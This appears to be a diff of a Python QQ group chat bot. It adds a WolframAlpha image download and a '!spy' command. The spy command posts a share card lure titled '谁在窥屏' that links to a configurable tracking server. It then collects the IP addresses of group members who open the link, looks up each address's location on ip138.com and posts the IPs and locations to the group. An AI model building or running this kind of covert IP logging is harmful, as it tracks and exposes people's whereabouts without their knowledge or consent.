@@ -8,6 +8,8 @@ sys.setdefaultencoding('gbk')
 
 import os
 import logging
+import base64
+from bs4 import BeautifulSoup
 logging.basicConfig(
     level       = logging.INFO,
     format      = '%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
@@ -24,14 +26,16 @@ danbooru_url = 'http://danbooru.donmai.us/'
 ignore_file = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'ignore.json')
 admin_file = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'admin.json')
 bface_file = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'bface.data')
+config_file = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'config.json')
 voice_config = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'voice.json')
 invoker_skill = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'invoker.json')
+
 maxImageSize = 4000000
 maxExposionTime = 1
 
 import CQSDK
 from CQGroupMemberInfo import CQGroupMemberInfo
-from CQMessage import CQAt, CQImage, CQRecord
+from CQMessage import CQAt, CQImage, CQRecord, CQShare
 
 from pypinyin import pinyin, lazy_pinyin
 import pypinyin
@@ -54,6 +58,7 @@ imagePath = 'F:/酷Q Pro/data/image/comic/'
 
 systemQQID = 1000000
 anonymousQQID = 80000000
+
 
 class Member:
     info = None
@@ -154,7 +159,7 @@ class CQHandler(object):
 
     def __init__(self):
         logging.info('__init__')
-        self._key_regex = re.compile('^.xx|!save|!idol|!drive|!rank|!roll|!learn|!forget|!list|!tag|!banword|!calc|!invoke')
+        self._key_regex = re.compile('^.xx|!save|!idol|!drive|!rank|!roll|!learn|!forget|!list|!tag|!banword|!calc|!invoke|!spy')
         self.keywords = []
         self.banwords = []
         self._data_file = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'xx.data')
@@ -193,6 +198,7 @@ class CQHandler(object):
         self.load_ignore()
         self.load_admin()
         self.load_invoker()
+        self.load_config()
 
     def save(self):
         with open(self._data_file,'w+') as f:
@@ -223,6 +229,11 @@ class CQHandler(object):
             logging.info(data)
             f.write(json.dumps(data))
             f.close()
+
+    def load_config(self):
+        with open(config_file, 'r') as f:
+            data = json.load(f)
+            self.spyIP = str(data['spyIP'])
 
     def load_ignore(self):
         with open(ignore_file, 'r') as f:
@@ -362,15 +373,27 @@ class CQHandler(object):
             except Exception as e:
                 logging.exception(e)
 
+    def downloadCalcImg(url):
+        logging.info(url)
+        r = requests.get(str(url))
+        logging.info("yes")
+        filename = sourcePath + 'calc.gif'
+        logging.info(filename)
+        open(filename, "wb").write(r.content)
+
     def calc(self, fromGroup, QQID, inpt):
         wapr = WolframAlphaResult(inpt)
-        result = wapr.calcResult()
-        logging.info(result)
+        result, img = wapr.calcResult()
         if result:
-            try:
-                CQSDK.SendGroupMsg(fromGroup, str(CQAt(QQID)) + '结果是: ' + str(result))
-            except Exception as e:
-                logging.exception(e)
+            CQSDK.SendGroupMsg(fromGroup, str(CQAt(QQID)) + '结果是: ' + str(result))
+            if img:
+                logging.info("???")
+                r = requests.get(str(img))
+                logging.info("yes")
+                filename = sourcePath + 'calc.gif'
+                logging.info(filename)
+                open(filename, "wb").write(r.content)
+                CQSDK.SendGroupMsg(fromGroup, str(CQImage('calc.gif')))
         else:
             CQSDK.SendGroupMsg(fromGroup, str(CQAt(QQID)) + '输入有误')
 
@@ -696,6 +719,36 @@ class CQHandler(object):
             CQSDK.SendGroupMsg(fromGroup, str(CQAt(QQID)) + str(CQImage(relativePath)))
         except Exception as e:
             logging.exception(e)
+
+    def spy(self, fromGroup, QQID, sendTime):
+        avatarUrl = base64.b64encode('http://q.qlogo.cn/headimg_dl?dst_uin=' + str(QQID) + '&spec=100')
+        url = self.spyIP + '/1.php?username=' + str(sendTime) + '&url=' + str(avatarUrl)
+        CQSDK.SendGroupMsg(fromGroup, str(CQShare(' ', '谁在窥屏', '正在收集数据...', url)))
+        dataUrl = self.spyIP + '/' + str(sendTime) + '.txt'
+        tLast = datetime.now() + timedelta(seconds = 5)
+        count = 0
+        while datetime.now() < tLast:
+            count = count + 1
+        r = requests.get(dataUrl)
+        while not r:
+            r = requests.get(dataUrl)
+        logging.info(r.text)
+        r = requests.get(dataUrl)
+        logging.info(r.text)
+        r = requests.get(dataUrl)
+        data = r.text
+        IPArray = [str(l.split(',')[0]) for l in data.split('#')[:-1]]
+        logging.info(IPArray)
+        retMsg = '窥屏的小伙伴的IP地址\n'
+        for ip in IPArray:
+            r = requests.get('http://ip138.com/ips138.asp?ip=' + str(ip))
+            r.encoding = 'GBK'
+            soup = BeautifulSoup(r.text, 'html.parser')
+            data = soup.find('ul', class_='ul1')
+            address = data.find('li').text
+            logging.info(address)
+            retMsg += str(ip) + ' ' + str(address) + '\n'
+        CQSDK.SendGroupMsg(fromGroup, retMsg)
         
     def pk(self, founder, target):
         pass
@@ -751,7 +804,6 @@ class CQHandler(object):
                         logging.exception(e)
 
             logging.info("flag3")
-            msg = msg.replace(' ', '')
             msg = msg.replace('！', '!')
             content = msg.lower()
             result = re.findall(self._key_regex, content)
@@ -759,6 +811,9 @@ class CQHandler(object):
                 cmd = result[0]
                 logging.info(cmd)
                 para = msg[len(cmd):]
+                if len(para) > 0:
+                    while para[0] == ' ':
+                        para = para[1:]
                 if cmd == '.xx' and fromGroup == groupID[0]:
                     retMsg = '你现在的境界为 ' + self.members[fromQQ].levelName + str(CQAt(fromQQ))
                     try:
@@ -793,8 +848,9 @@ class CQHandler(object):
                 elif cmd == '!calc':
                     self.calc(fromGroup, fromQQ, para)
                 elif cmd == '!invoke':
-                    logging.info(para)
                     self.invoker(fromGroup, fromQQ, para)
+                elif cmd == '!spy':
+                    self.spy(fromGroup, fromQQ, sendTime)
             
             logging.info("flag4")
 
